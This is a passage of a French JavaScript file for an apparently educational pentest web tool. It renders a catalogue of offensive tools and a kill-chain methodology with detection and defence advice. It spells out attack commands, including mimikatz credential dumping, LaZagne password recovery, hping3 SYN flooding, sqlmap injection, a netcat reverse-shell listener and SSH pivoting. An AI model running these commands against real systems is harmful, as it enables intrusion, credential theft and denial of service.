        // --- Résilience / DoS (défensif) ---
        { name: 'hping3', cat: 'Résilience / DoS', purpose: 'Forge de paquets TCP/IP pour tester la robustesse réseau et la résilience d\'un pare-feu.', use: 'hping3 -S <ton-hote> -p 80 -c 10  (test autorisé)', kw: ['ddos', 'dos', 'deni de service', 'flood', 'stress', 'paquet', 'resilience'], att: ['T1498.001'], note: '⚠ Tester uniquement TES propres systèmes. Viser un tiers = déni de service, illégal. Côté défense : rate-limiting, SYN cookies, anti-DDoS amont.' },
        { name: 'slowhttptest', cat: 'Résilience / DoS', purpose: 'Évalue la résistance d\'un serveur web aux attaques « lentes » (Slowloris) — pour durcir ta config.', use: 'slowhttptest -u http://ton-serveur  (test autorisé)', kw: ['ddos', 'dos', 'slowloris', 'web', 'stress', 'resilience', 'deni de service'], att: ['T1499.003'], note: '⚠ Uniquement sur tes serveurs. Défense : timeouts stricts, reverse-proxy, mod_reqtimeout.' },
        { name: 'Locust / wrk', cat: 'Résilience / DoS', purpose: 'Tests de charge légitimes : mesurer les limites de performance de TON application.', use: 'wrk -t4 -c100 -d30s http://ton-app', kw: ['charge', 'stress', 'performance', 'resilience', 'load test', 'dos'], att: [], note: 'Outil de test de charge, pensé pour tes propres services.' },

        // --- C2 & post-exploitation ---
        { name: 'mimikatz', cat: 'C2 & post-exploit', purpose: 'Extraction d\'identifiants Windows depuis la mémoire (hash, tickets Kerberos).', use: 'sekurlsa::logonpasswords', kw: ['credential', 'windows', 'hash', 'kerberos', 'post-exploit', 'lsass'], att: ['T1003.001'], note: 'Technique sensible : labs / cibles autorisées.' },
        { name: 'Sliver / Havoc', cat: 'C2 & post-exploit', purpose: 'Frameworks de command-and-control pour piloter des implants lors d\'un engagement red team.', use: 'Générer un implant + session C2', kw: ['c2', 'command control', 'implant', 'red team', 'post-exploit'], att: ['T1071'], note: 'Usage red team autorisé uniquement.' },
        { name: 'LaZagne', cat: 'C2 & post-exploit', purpose: 'Récupère les mots de passe stockés localement (navigateurs, Wi-Fi, logiciels).', use: 'lazagne.exe all', kw: ['credential', 'mot de passe', 'post-exploit', 'local'], att: ['T1555'], note: 'Sur une machine que tu contrôles / cible autorisée.' }
    ];

    let arsenalWired = false;
    let arsenalActiveCat = 'Tous';

    function initArsenal() {
        const catWrap = $('arsenal-cats');
        if (!catWrap) return;
        if (!arsenalWired) {
            const cats = ['Tous'].concat(Array.from(new Set(arsenal.map(t => t.cat))));
            catWrap.innerHTML = cats.map(c =>
                '<button type="button" class="arsenal-cat text-[11px] px-2.5 py-1 rounded-md border transition-colors ' +
                (c === arsenalActiveCat ? 'bg-accent-600 text-white border-accent-500/60' : 'bg-zinc-950 text-zinc-300 border-zinc-800 hover:bg-zinc-800') +
                '" data-cat="' + escapeHtml(c) + '">' + escapeHtml(c) + '</button>'
            ).join('');

            catWrap.querySelectorAll('.arsenal-cat').forEach(btn => {
                btn.addEventListener('click', () => {
                    arsenalActiveCat = btn.getAttribute('data-cat');
                    catWrap.querySelectorAll('.arsenal-cat').forEach(b => {
                        const on = b.getAttribute('data-cat') === arsenalActiveCat;
                        b.className = 'arsenal-cat text-[11px] px-2.5 py-1 rounded-md border transition-colors ' +
                            (on ? 'bg-accent-600 text-white border-accent-500/60' : 'bg-zinc-950 text-zinc-300 border-zinc-800 hover:bg-zinc-800');
                    });
                    renderArsenal();
                });
            });

            const q = $('arsenal-query');
            if (q) q.addEventListener('input', renderArsenal);

            const exp = $('arsenal-export');
            if (exp) exp.addEventListener('click', () => {
                const list = arsenalMatches();
                let md = '# Arsenal NetCmd Pro' + (arsenalActiveCat !== 'Tous' ? ' — ' + arsenalActiveCat : '') + '\n\n';
                md += '> ' + list.length + ' outil(s). Référence pédagogique — usage autorisé uniquement.\n\n';
                list.forEach(t => {
                    md += '## ' + t.name + '  _(' + t.cat + ')_\n\n';
                    md += t.purpose + '\n\n';
                    md += '- **Usage :** `' + t.use + '`\n';
                    if (t.att && t.att.length) md += '- **ATT&CK :** ' + t.att.join(', ') + '\n';
                    if (t.note) md += '- **Note :** ' + t.note + '\n';
                    md += '\n';
                });
                downloadFile('netcmd-arsenal.md', md, 'text/markdown');
            });
            arsenalWired = true;
        }
        renderArsenal();
    }

    function arsenalMatches() {
        const query = norm($('arsenal-query') ? $('arsenal-query').value : '');
        const words = query.split(/\s+/).filter(Boolean);
        return arsenal.filter(t => {
            if (arsenalActiveCat !== 'Tous' && t.cat !== arsenalActiveCat) return false;
            if (!words.length) return true;
            const hay = norm(t.name + ' ' + t.cat + ' ' + t.purpose + ' ' + t.kw.join(' '));
            return words.every(w => hay.includes(w));
        });
    }

    function renderArsenal() {
        const container = $('arsenal-results');
        const countEl = $('arsenal-count');
        if (!container) return;
        const matches = arsenalMatches();

        if (countEl) countEl.textContent = matches.length + ' outil(s) — base pédagogique, ' + arsenal.length + ' au total';

        if (!matches.length) {
            container.innerHTML = '<p class="text-zinc-500 italic col-span-full">Aucun outil trouvé. Essaie « scan », « mot de passe », « ad », « pivot », « ddos », « forensics »...</p>';
            return;
        }

        container.innerHTML = matches.map(t => {
            const att = (t.att && t.att.length)
                ? '<div class="flex flex-wrap gap-1 mt-2">' + t.att.map(a => '<span class="text-[9px] font-mono px-1 py-0.5 rounded bg-blue-500/10 text-blue-300 border border-blue-500/20" title="Technique MITRE ATT&CK">' + escapeHtml(a) + '</span>').join('') + '</div>'
                : '';
            const note = t.note
                ? '<div class="mt-2 text-[10px] text-amber-300/80 bg-amber-500/5 border border-amber-500/15 rounded px-2 py-1 flex items-start gap-1"><iconify-icon icon="lucide:alert-triangle" width="12" class="mt-0.5 shrink-0"></iconify-icon><span>' + escapeHtml(t.note) + '</span></div>'
                : '';
            const useId = 'ars-' + Math.random().toString(36).slice(2, 9);
            return '<div class="bg-zinc-900/20 border border-zinc-800 rounded-xl p-4 flex flex-col hover:border-zinc-700 transition-colors">' +
                '<div class="flex items-center justify-between gap-2 mb-1">' +
                    '<h3 class="text-sm font-semibold text-white font-mono">' + escapeHtml(t.name) + '</h3>' +
                    '<span class="text-[9px] text-zinc-400 border border-zinc-800 bg-zinc-800/40 px-1.5 py-0.5 rounded uppercase tracking-wide shrink-0">' + escapeHtml(t.cat) + '</span>' +
                '</div>' +
                '<p class="text-[11px] text-zinc-300 leading-relaxed flex-1">' + escapeHtml(t.purpose) + '</p>' +
                '<div class="mt-2 text-[10px] text-zinc-500 uppercase font-bold tracking-wider">Usage type</div>' +
                '<code id="' + useId + '" class="block bg-zinc-950 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-200 font-mono break-all cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + useId + '\')">' + escapeHtml(t.use) + '</code>' +
                att + note +
            '</div>';
        }).join('');
    }

    // =========================================================================
    // 12bis. MÉTHODOLOGIE (KILL CHAIN PÉDAGOGIQUE)
    // =========================================================================

    const methodologySteps = [
        {
            num: 1, phase: 'Reconnaissance (OSINT)', icon: 'lucide:search', color: 'blue', goto: 'webaudit',
            objective: 'Collecter un maximum d\'informations sur la cible sans interagir directement avec ses systèmes (sources publiques) : noms de domaine, adresses IP, e-mails, technologies, employés.',
            tools: ['whois', 'nslookup / dig', 'theHarvester', 'Google Dorks', 'Shodan'],
            example: 'whois exemple.com  →  identifie le propriétaire et les serveurs DNS',
            detection: 'Phase quasi invisible : elle utilise des sources publiques. On surveille surtout les pics de requêtes DNS/WHOIS et l\'exposition d\'informations sensibles.',
            defense: 'Limiter les infos publiques (WHOIS privé, pas d\'e-mails exposés), séparer les environnements, surveiller sa surface d\'exposition (ex : alertes Shodan).'
        },
        {
            num: 2, phase: 'Scan & Énumération', icon: 'lucide:radar', color: 'accent', goto: 'scan',
            objective: 'Cartographier la cible : hôtes actifs, ports ouverts, services et versions, pour identifier les points d\'entrée potentiels.',
            tools: ['nmap', 'masscan', 'enum4linux', 'gobuster'],
            example: 'nmap -sV -sC -p- 10.10.10.5  →  ports ouverts + versions des services',
            detection: 'Très détectable : un scan génère beaucoup de connexions. Les IDS/IPS (Snort, Suricata) et les pare-feux repèrent les balayages de ports.',
            defense: 'Fermer les ports inutiles, segmenter le réseau (VLAN), limiter le débit de connexions (rate-limiting), déployer un IDS.'
        },
        {
            num: 3, phase: 'Analyse du trafic', icon: 'lucide:activity', color: 'cyan', goto: 'traffic',
            objective: 'Observer le trafic réseau pour comprendre les protocoles utilisés, repérer des identifiants en clair ou préparer une attaque (ex : man-in-the-middle).',
            tools: ['tcpdump', 'Wireshark', 'ettercap'],
            example: 'tcpdump -i eth0 -nn port 80  →  capture le trafic HTTP non chiffré',
            detection: 'La capture passive est difficile à détecter. Le MITM actif (ARP spoofing) se repère via des tables ARP incohérentes.',
            defense: 'Chiffrer tout (HTTPS, SSH, VPN), activer le DHCP snooping et la Dynamic ARP Inspection sur les switchs.'
        },
        {
            num: 4, phase: 'Exploitation', icon: 'lucide:shield-alert', color: 'orange', goto: 'webaudit',
            objective: 'Exploiter une vulnérabilité (injection SQL, faille web, service non patché) pour obtenir un premier accès ou extraire des données.',
            tools: ['sqlmap', 'Metasploit', 'Burp Suite', 'exploits (searchsploit)'],
            example: 'sqlmap -u "http://cible/page.php?id=1" --dbs  →  teste l\'injection SQL',
            detection: 'Un WAF et les logs applicatifs repèrent les payloads malveillants (motifs SQL, pics d\'erreurs 500).',
            defense: 'Requêtes préparées (anti-injection), mises à jour régulières, WAF, principe du moindre privilège sur la base de données.'
        },
        {
            num: 5, phase: 'Accès & Reverse Shell', icon: 'lucide:terminal', color: 'emerald', goto: 'revshell',
            objective: 'Établir un canal de contrôle depuis la machine compromise vers l\'attaquant — souvent une connexion inverse (reverse shell) qui contourne les pare-feux entrants.',
            tools: ['netcat', 'bash / python / powershell', 'msfvenom'],
            example: 'nc -lvnp 4444  (côté attaquant, en écoute)  +  payload côté cible',
            detection: 'Connexions sortantes inhabituelles vers des IP/ports suspects ; processus enfants anormaux (ex : bash lançant une socket).',
            defense: 'Filtrer le trafic SORTANT (egress filtering), EDR surveillant les processus, listes blanches d\'applications.'
        },
        {
            num: 6, phase: 'Pivoting & Mouvement latéral', icon: 'lucide:route', color: 'purple', goto: 'pivoting',
            objective: 'Rebondir depuis la machine compromise pour atteindre des systèmes internes inaccessibles directement, et étendre le contrôle sur le réseau.',
            tools: ['ssh (-D / -L / -R)', 'proxychains', 'chisel', 'ligolo-ng'],
            example: 'ssh -D 1080 -N user@pivot  →  proxy SOCKS vers le réseau interne',
            detection: 'Connexions internes inhabituelles, tunnels SSH longue durée, trafic est-ouest anormal entre segments.',
            defense: 'Micro-segmentation réseau, surveillance du trafic interne (est-ouest), comptes à privilèges limités, MFA.'
        },
        {
            num: 7, phase: 'Post-exploitation & Persistance', icon: 'lucide:key-round', color: 'red', goto: null,
            objective: 'Maintenir l\'accès (persistance), élever ses privilèges, récolter des identifiants et exfiltrer les données. Puis effacer ses traces.',
            tools: ['mimikatz', 'LinPEAS / WinPEAS', 'crontab / services', 'tâches planifiées'],
            example: 'sudo -l  ·  find / -perm -4000  →  cherche des chemins d\'élévation de privilèges',
            detection: 'Nouveaux comptes/tâches planifiées, accès anormaux à la mémoire (LSASS), gros transferts sortants (exfiltration).',
            defense: 'Journalisation centralisée (SIEM), surveillance de l\'intégrité, rotation des secrets, sauvegardes hors-ligne, Credential Guard.'
        }
    ];

    const methoColors = {
        blue: 'border-l-blue-500 text-blue-400', accent: 'border-l-accent-500 text-accent-400',
        cyan: 'border-l-cyan-500 text-cyan-400', orange: 'border-l-orange-500 text-orange-400',
        emerald: 'border-l-emerald-500 text-emerald-400', purple: 'border-l-purple-500 text-purple-400',
        red: 'border-l-red-500 text-red-400'
    };

    // Tactiques MITRE ATT&CK associées à chaque phase
    const methoTactics = {
        1: ['TA0043 Reconnaissance'], 2: ['TA0007 Discovery'], 3: ['TA0009 Collection'],
        4: ['TA0001 Initial Access'], 5: ['TA0002 Execution', 'TA0011 Command & Control'],
        6: ['TA0008 Lateral Movement'], 7: ['TA0004 Priv. Esc', 'TA0003 Persistence', 'TA0010 Exfiltration']
    };

    let methoRendered = false;
    function renderMethodology() {
        if (methoRendered) return;
        const container = $('methodology-steps');
        if (!container) return;
        let html = '<div class="flex justify-end mb-1"><button id="metho-export" class="text-[10px] px-2 py-1 rounded border border-zinc-700 text-zinc-300 hover:bg-zinc-800 transition-colors flex items-center gap-1"><iconify-icon icon="lucide:download" width="12"></iconify-icon>Exporter (.md)</button></div>';
        methodologySteps.forEach(s => {
            const c = methoColors[s.color] || methoColors.blue;
            const colorText = c.split(' ')[1];
            const tactics = (methoTactics[s.num] || []).map(t => '<span class="text-[9px] font-mono px-1 py-0.5 rounded bg-blue-500/10 text-blue-300 border border-blue-500/20" title="Tactique MITRE ATT&CK">' + escapeHtml(t) + '</span>').join(' ');
            html += '<div class="bg-zinc-900/20 border border-zinc-800 border-l-2 ' + c.split(' ')[0] + ' rounded-xl p-5">' +
                '<div class="flex items-start justify-between gap-4 mb-2">' +
                    '<div class="flex items-center gap-3">' +
                        '<div class="w-9 h-9 rounded-lg bg-zinc-800/60 flex items-center justify-center ' + colorText + ' shrink-0"><iconify-icon icon="' + s.icon + '" width="18"></iconify-icon></div>' +
                        '<div><div class="text-[10px] text-zinc-500 uppercase tracking-wider">Phase ' + s.num + '</div>' +
                        '<h3 class="text-sm font-semibold text-white">' + escapeHtml(s.phase) + '</h3></div>' +
                    '</div>' +
                    (s.goto ? '<button class="metho-goto shrink-0 text-[10px] px-2 py-1 rounded border border-zinc-700 text-zinc-300 hover:bg-zinc-800 transition-colors flex items-center gap-1" data-goto="' + s.goto + '"><iconify-icon icon="lucide:arrow-right" width="12"></iconify-icon>Ouvrir l\'outil</button>' : '') +
                '</div>' +
                '<div class="flex flex-wrap gap-1 mb-3">' + tactics + '</div>' +
                '<p class="text-xs text-zinc-300 leading-relaxed mb-3">' + escapeHtml(s.objective) + '</p>' +
                '<div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-[11px]">' +
                    '<div class="space-y-1">' +
                        '<div class="text-zinc-500 uppercase text-[10px] font-bold tracking-wider">Outils</div>' +
                        '<div class="flex flex-wrap gap-1.5">' + s.tools.map(t => '<span class="px-1.5 py-0.5 rounded bg-zinc-800/60 border border-zinc-800 text-zinc-300 font-mono">' + escapeHtml(t) + '</span>').join('') + '</div>' +
                        '<div class="mt-2 text-zinc-500 uppercase text-[10px] font-bold tracking-wider">Exemple</div>' +
                        '<code class="block bg-zinc-950 border border-zinc-800 rounded px-2 py-1.5 text-zinc-200 font-mono break-all">' + escapeHtml(s.example) + '</code>' +
                    '</div>' +
                    '<div class="space-y-2">' +
                        '<div class="p-2 rounded bg-amber-500/5 border border-amber-500/15"><div class="text-amber-400 uppercase text-[10px] font-bold tracking-wider mb-0.5">🔍 Détection (blue team)</div><p class="text-zinc-400 leading-relaxed">' + escapeHtml(s.detection) + '</p></div>' +
                        '<div class="p-2 rounded bg-emerald-500/5 border border-emerald-500/15"><div class="text-emerald-400 uppercase text-[10px] font-bold tracking-wider mb-0.5">🛡 Défense</div><p class="text-zinc-400 leading-relaxed">' + escapeHtml(s.defense) + '</p></div>' +
                    '</div>' +
                '</div>' +
            '</div>';
        });
        container.innerHTML = html;
        container.querySelectorAll('.metho-goto').forEach(btn => {
            btn.addEventListener('click', () => showModule(btn.getAttribute('data-goto')));
        });
        const exp = $('metho-export');
        if (exp) exp.addEventListener('click', () => {
            let md = '# Méthodologie d\'une cyberattaque (kill chain)\n\n> Référence pédagogique — usage sur systèmes autorisés uniquement.\n\n';
            methodologySteps.forEach(s => {
                md += '## Phase ' + s.num + ' — ' + s.phase + '\n\n';
                md += '**Tactiques ATT&CK :** ' + (methoTactics[s.num] || []).join(', ') + '\n\n';
                md += s.objective + '\n\n';
                md += '- **Outils :** ' + s.tools.join(', ') + '\n';
                md += '- **Exemple :** `' + s.example + '`\n';
                md += '- **Détection :** ' + s.detection + '\n';
                md += '- **Défense :** ' + s.defense + '\n\n';
            });
            downloadFile('netcmd-methodologie.md', md, 'text/markdown');
        });
        methoRendered = true;
    }

    // =========================================================================
    // 13. PERSISTANCE (localStorage) DES CHAMPS
    // =========================================================================

    const fieldsToSave = ['subnet-ip', 'subnet-mask', 'source-input', 'iface-input',
        'input-ports', 'scan-target', 'scan-ports', 'traffic-iface', 'traffic-filter',
        'rev-ip', 'rev-port', 'pivot-user', 'pivot-ip'];

    fieldsToSave.forEach(id => {
        const el = $(id);
        if (!el) return;
        const saved = localStorage.getItem('netcmd_' + id);
        if (saved !== null) el.value = saved;
        el.addEventListener('input', () => {
            try { localStorage.setItem('netcmd_' + id, el.value); } catch (e) {}
        });
    });

    // =========================================================================
    // 14. INITIALISATION
    // =========================================================================

    showModule('firewall');
    updateFirewallCommand();
});
